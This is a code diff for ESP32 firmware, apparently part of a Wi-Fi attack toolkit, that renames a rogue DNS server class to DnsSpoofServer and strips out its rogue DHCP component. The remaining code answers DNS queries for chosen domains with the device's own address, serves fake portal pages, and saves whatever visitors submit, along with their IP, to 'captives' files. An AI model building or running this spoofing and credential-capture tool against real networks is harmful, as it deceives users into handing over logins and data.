@@ -1,62 +1,39 @@
-#include "RogueDnsServer.h"
+#include "DnsSpoofServer.h"
 #include "core/Device.h"
-#include <esp_netif.h>
 #include <WiFi.h>
 
 // ── Public ──────────────────────────────────────────────────────────────────
 
-bool RogueDnsServer::begin(IPAddress apIP)
+bool DnsSpoofServer::begin(IPAddress apIP)
 {
   _apIP = apIP;
-  _loadConfig(); // ok if no dns_config — captive portal can work without it
+  _loadConfig();
 
-  // Stop built-in DHCP server to free port 67
-  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-  if (apNetif) esp_netif_dhcps_stop(apNetif);
-
-  if (!_dhcpUdp.begin(67)) {
-    if (apNetif) esp_netif_dhcps_start(apNetif);
-    return false;
-  }
-
-  if (!_dnsUdp.begin(53)) {
-    _dhcpUdp.stop();
-    if (apNetif) esp_netif_dhcps_start(apNetif);
-    return false;
-  }
-
-  memset(_poolUsed, 0, sizeof(_poolUsed));
-  memset(_clients, 0, sizeof(_clients));
+  if (!_dnsUdp.begin(53)) return false;
 
   _startWeb();
   _running = true;
   return true;
 }
 
-void RogueDnsServer::end()
+void DnsSpoofServer::end()
 {
   if (!_running) return;
   _running = false;
 
   _stopWeb();
-  _dhcpUdp.stop();
   _dnsUdp.stop();
-
-  // Restart built-in DHCP server
-  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-  if (apNetif) esp_netif_dhcps_start(apNetif);
 }
 
-void RogueDnsServer::update()
+void DnsSpoofServer::update()
 {
   if (!_running) return;
-  _processDhcp();
   _processDns();
 }
 
 // ── Config ──────────────────────────────────────────────────────────────────
 
-bool RogueDnsServer::_loadConfig()
+bool DnsSpoofServer::_loadConfig()
 {
   _recordCount = 0;
   if (!Uni.Storage || !Uni.Storage->exists(CONFIG_PATH)) return false;
@@ -93,150 +70,9 @@ bool RogueDnsServer::_loadConfig()
   return _recordCount > 0;
 }
 
-// ── DHCP Server ─────────────────────────────────────────────────────────────
-
-void RogueDnsServer::_processDhcp()
-{
-  int len = _dhcpUdp.parsePacket();
-  if (len <= 0 || len > 512) return;
-
-  uint8_t buf[512];
-  _dhcpUdp.read(buf, len);
-  _handleDhcpPacket(buf, len);
-}
-
-void RogueDnsServer::_handleDhcpPacket(uint8_t* buf, int len)
-{
-  uint8_t msgType = _getDhcpMsgType(buf, len);
-  uint8_t ipSuffix = 0;
-
-  if (msgType == 1) { // DISCOVER → OFFER
-    uint8_t mac[6];
-    memcpy(mac, &buf[28], 6);
-    ipSuffix = _allocateIp(mac);
-    if (ipSuffix == 0) return;
-    _buildDhcpResponse(buf, len, 2, ipSuffix);
-  } else if (msgType == 3) { // REQUEST → ACK
-    uint8_t mac[6];
-    memcpy(mac, &buf[28], 6);
-    ipSuffix = _allocateIp(mac);
-    if (ipSuffix == 0) return;
-    _buildDhcpResponse(buf, len, 5, ipSuffix);
-  } else {
-    return;
-  }
-
-  _dhcpUdp.beginPacket(IPAddress(255, 255, 255, 255), 68);
-  _dhcpUdp.write(buf, len);
-  _dhcpUdp.endPacket();
-}
-
-uint8_t RogueDnsServer::_getDhcpMsgType(uint8_t* buf, int len)
-{
-  int i = 240; // options start after magic cookie
-  while (i < len) {
-    uint8_t opt = buf[i++];
-    if (opt == 255) break;
-    if (opt == 0) continue;
-    if (i >= len) break;
-    uint8_t optLen = buf[i++];
-    if (i + optLen > len) break;
-    if (opt == 53 && optLen == 1) return buf[i];
-    i += optLen;
-  }
-  return 0;
-}
-
-void RogueDnsServer::_buildDhcpResponse(uint8_t* buf, int& len, uint8_t msgType, uint8_t ipSuffix)
-{
-  buf[0] = 2; // BOOTREPLY
-
-  // yiaddr = client's assigned IP
-  buf[16] = _apIP[0];
-  buf[17] = _apIP[1];
-  buf[18] = _apIP[2];
-  buf[19] = ipSuffix;
-
-  // siaddr = server IP
-  buf[20] = _apIP[0];
-  buf[21] = _apIP[1];
-  buf[22] = _apIP[2];
-  buf[23] = _apIP[3];
-
-  // broadcast flag
-  buf[10] = 0x80;
-  buf[11] = 0x00;
-
-  // clear sname + file
-  memset(&buf[34], 0, 10);
-
-  // magic cookie
-  buf[236] = 0x63;
-  buf[237] = 0x82;
-  buf[238] = 0x53;
-  buf[239] = 0x63;
-
-  int i = 240;
-
-  // Option 53: Message Type
-  buf[i++] = 53; buf[i++] = 1; buf[i++] = msgType;
-
-  // Option 54: Server Identifier
-  buf[i++] = 54; buf[i++] = 4;
-  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
-  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];
-
-  // Option 1: Subnet Mask
-  buf[i++] = 1; buf[i++] = 4;
-  buf[i++] = 255; buf[i++] = 255; buf[i++] = 255; buf[i++] = 0;
-
-  // Option 3: Router (gateway = ESP32)
-  buf[i++] = 3; buf[i++] = 4;
-  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
-  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];
-
-  // Option 6: DNS Server (= ESP32)
-  buf[i++] = 6; buf[i++] = 4;
-  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
-  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];
-
-  // Option 51: Lease Time (1 day)
-  buf[i++] = 51; buf[i++] = 4;
-  buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x51; buf[i++] = 0x80;
-
-  // Option 255: End
-  buf[i++] = 255;
-
-  // Pad to 4-byte alignment
-  while (i % 4 != 0) buf[i++] = 0;
-
-  len = i;
-}
-
-uint8_t RogueDnsServer::_allocateIp(uint8_t* mac)
-{
-  // Check if MAC already has an IP
-  for (int i = 0; i < DHCP_POOL_SIZE; i++) {
-    if (_clients[i].suffix != 0 && memcmp(_clients[i].mac, mac, 6) == 0) {
-      return _clients[i].suffix;
-    }
-  }
-
-  // Allocate new
-  for (int i = 0; i < DHCP_POOL_SIZE; i++) {
-    if (!_poolUsed[i]) {
-      _poolUsed[i] = true;
-      memcpy(_clients[i].mac, mac, 6);
-      _clients[i].suffix = _poolStart + i;
-      return _clients[i].suffix;
-    }
-  }
-  return 0; // pool exhausted
-}
-
 // ── DNS Server ──────────────────────────────────────────────────────────────
 
-void RogueDnsServer::_processDns()
+void DnsSpoofServer::_processDns()
 {
   int len = _dnsUdp.parsePacket();
   if (len <= 0 || len > 512) return;
@@ -292,7 +128,7 @@ void RogueDnsServer::_processDns()
   _dnsUdp.endPacket();
 }
 
-bool RogueDnsServer::_matchDomain(const char* query, const char* config)
+bool DnsSpoofServer::_matchDomain(const char* query, const char* config)
 {
   // Case-insensitive match, also match subdomains
   // e.g. config="google.com" matches "google.com" and "www.google.com"
@@ -305,7 +141,7 @@ bool RogueDnsServer::_matchDomain(const char* query, const char* config)
   return false;
 }
 
-const char* RogueDnsServer::_findPath(const char* domain)
+const char* DnsSpoofServer::_findPath(const char* domain)
 {
   for (int i = 0; i < _recordCount; i++) {
     if (_matchDomain(domain, _records[i].domain)) {
@@ -317,7 +153,7 @@ const char* RogueDnsServer::_findPath(const char* domain)
 
 // ── Web Server (Port 80) ───────────────────────────────────────────────────
 
-void RogueDnsServer::_startWeb()
+void DnsSpoofServer::_startWeb()
 {
   _webServer = new AsyncWebServer(80);
 
@@ -345,7 +181,7 @@ void RogueDnsServer::_startWeb()
       if (data.length() > 0 && Uni.Storage) {
         String cleanHost = host;
         cleanHost.replace(".", "_");
-        String savePath = "/unigeek/wifi/captives/rogue_" + cleanHost + ".txt";
+        String savePath = "/unigeek/wifi/captives/spoof_" + cleanHost + ".txt";
         Uni.Storage->makeDir("/unigeek/wifi/captives");
 
         String entry = req->client()->remoteIP().toString() + " | " + data + "\n";
@@ -398,7 +234,7 @@ void RogueDnsServer::_startWeb()
   _webServer->begin();
 }
 
-void RogueDnsServer::_serveFromPath(const char* portalPath, AsyncWebServerRequest* req)
+void DnsSpoofServer::_serveFromPath(const char* portalPath, AsyncWebServerRequest* req)
 {
   String uri = req->url();
   if (uri.endsWith("/")) uri += "index.htm";
@@ -421,7 +257,7 @@ void RogueDnsServer::_serveFromPath(const char* portalPath, AsyncWebServerReques
   }
 }
 
-void RogueDnsServer::_stopWeb()
+void DnsSpoofServer::_stopWeb()
 {
   if (_webServer) {
     _webServer->end();
